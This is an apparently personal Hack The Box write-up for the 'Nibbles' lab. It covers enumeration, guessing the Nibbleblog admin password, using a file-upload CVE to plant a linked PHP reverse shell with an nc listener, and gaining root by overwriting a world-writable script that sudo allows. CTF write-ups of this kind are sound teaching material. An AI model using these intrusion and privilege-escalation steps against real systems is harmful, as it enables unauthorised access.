# Hack The Box: Nibbles
#### Writeup by Aidan Wech (Onyxymous)

---

### Stats
| **Key** | **Value** |
| --- | --- |
| OS | `Linux` |
| Difficulty | `Easy` |
| Released on | `01/13/2018` |
| Description | `Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.` |

---

### Enuration
Using `nmap`, we are able to discover the following services:

```bash
nmap -sV -sC -p- [IP_ADDR]
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-17 03:22 EDT
Nmap scan report for [IP_ADDR]
Host is up (0.015s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.68 seconds
```

We are able to see that we have an OpenSSH service running on port 22 and a website hosted via Apache on port 80.

Navigating to the website reveals this:

<p align="center">
  <img width="640" alt="image" src="https://github.com/user-attachments/assets/09323abc-09ea-4755-9f69-7c55daaf2a38" />
</p>

Opening the site in devtools reveals a hidden directory:

<p align="center">
  <img width="640" alt="image" src="https://github.com/user-attachments/assets/c49d087d-648b-4083-bda0-64c96aa5a30d" />
</p>

Let's use `gobuster` to see if there are any interesting directories in `nibbleblog`

```bash
gobuster dir -u http://[IP_ADDR]/nibbleblog/ -w /usr/share/dirb/wordlists/common.txt
```

```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/admin.php (Status: 200)
/content (Status: 301)
/index.php (Status: 200)
/languages (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/themes (Status: 301)
```

First, I took a look at what `README` says:

```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

...
```

We learn that Nibbleblog is using `v4.0.3`. Let's check out `admin.php`:

<p align="center">
  <img width="640" alt="image" src="https://github.com/user-attachments/assets/e0bcbb93-2a29-4c94-b222-a6c12e2f98c0" />
</p>

Searching for Nibbleblog exploits on [ExxploitDB](https://www.exploit-db.com/) led me to discover CVE 2015-6967, an arbitrary file upload vulnerability for Nibbleblog v4.0.3. This may come in handy later.

Finally, let's look through the `content` directory. This directory contains a `private` directory that holds a `users.xml` file:

```xml
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
</users>
```

We now know that `admin` is a valid username. After guessing a couple of attempts, the password turns out to be `nibbles`.

---

### Initial Access
The exploit says that arbitrary PHP code can be uploaded via the "My Images" plugin. I created a PHP file, `funimage`, that spawns a reverse shell on my machine at port 1234 using pentestmonkey's [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Let's upload the image and see what happens.

<p align="center">
  <img width="640" alt="image" src="https://github.com/user-attachments/assets/5a254932-1da1-40d2-9e0b-3e7b342650b4" />
</p>

A lot of warnings popped up, but maybe the file is there somewhere. Let's go check in the `config` directory:

<p align="center">
  <img width="640" alt="image" src="https://github.com/user-attachments/assets/4c1e1d78-54ad-41c6-82af-ff0eee75eeea" />
</p>

Sure enough it worked. Let's set up a listener:

```bash
nc -vlnp 1234
```

And when we open `image.php`, we obtain a reverse shell.

<p align="center">
  <img width="769" alt="image" src="https://github.com/user-attachments/assets/4cad8ebc-43f6-4193-b41d-72e7681981fa" >
</p>

The flag can be found at `/home/nibbler/user.txt`

---

### Priviledge Escalation

In `/home/nibbler`, we find this:

```
nibbler@Nibbles:/home/nibbler$ ls -la
ls -la
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Mar 12  2021 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Mar 12  2021 user.txt
```

Let's take a look at `personal.zip`.

```
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh
cat /home/nibbler/personal/stuff/monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
...

nibbler@Nibbles:/home/nibbler$ ls -la /home/nibbler/personal/stuff
ls -la /home/nibbler/personal/stuff
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

We can see that it contains a bash script, `monitor.sh`. While I do not really understand what the script is doing, what caught my eye were the permissions given to the script. Everyone has read, write, and execute permissions. 

I had a feeling that I knew where this this is going. Sure enough, when I typed in `sudo -l`:

```
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

I saw that `root` has the ability to run `monitor.sh` without needing to type in a password. Given the permissions `monitor.sh` has, we can execute arbitrary bash commands as `root`.

```
nibbler@Nibbles:/home/nibbler$ echo "whoami" > /home/nibbler/personal/stuff/monitor.sh
<er$ echo "whoami" > /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ sudo -u root /home/nibbler/personal/stuff/monitor.sh
<er$ sudo -u root /home/nibbler/personal/stuff/monitor.sh
root
nibbler@Nibbles:/home/nibbler$ echo "su -" > /home/nibbler/personal/stuff/monitor.sh
<er$ echo "su -" > /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ sudo -u root /home/nibbler/personal/stuff/monitor.sh
<er$ sudo -u root /home/nibbler/personal/stuff/monitor.sh
root@Nibbles:~#
```

The flag is in directory `/root/root.txt`.
